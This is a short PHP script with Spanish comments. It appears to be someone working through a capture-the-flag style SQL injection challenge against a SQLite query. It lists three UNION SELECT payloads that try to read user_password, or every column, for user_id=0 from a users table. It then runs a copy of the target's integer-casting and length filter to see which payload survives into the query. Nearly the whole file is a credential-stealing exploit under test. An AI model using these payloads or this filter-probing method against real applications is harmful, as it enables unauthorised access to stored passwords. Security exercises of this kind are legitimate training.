<?php
// En SQLite, puedo usar concatenación con || 
// O puedo usar columnas literales sin comas usando sintaxis especial

// Opciones:
// 1. Cerrar el IN y hacer UNION sin paréntesis interno
// 2. Usar sintaxis de SQLite que no requiera comas

$payloads = [
    // Intentar con subconsulta
    "0,0,1)) UNION SELECT(SELECT user_password FROM users WHERE user_id=0)--",
    
    // O simplemente obtener todas las columnas con *
    "0,0,1)) UNION SELECT * FROM users WHERE user_id=0--",
    
    // O cerrar antes y abrir nuevo paréntesis
    "0,0,1))UNION(SELECT * FROM users WHERE user_id=0)--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    echo "Parts: " . count($tmp) . "\n";
    
    for ($i = 0; $i < count($tmp); $i++) {
        $tmp[$i] = (int)$tmp[$i];
        if($tmp[$i] < 1) {
            unset($tmp[$i]);
        }
    }
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: '$selector'\n\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Query:\n$query\n";
}
?>
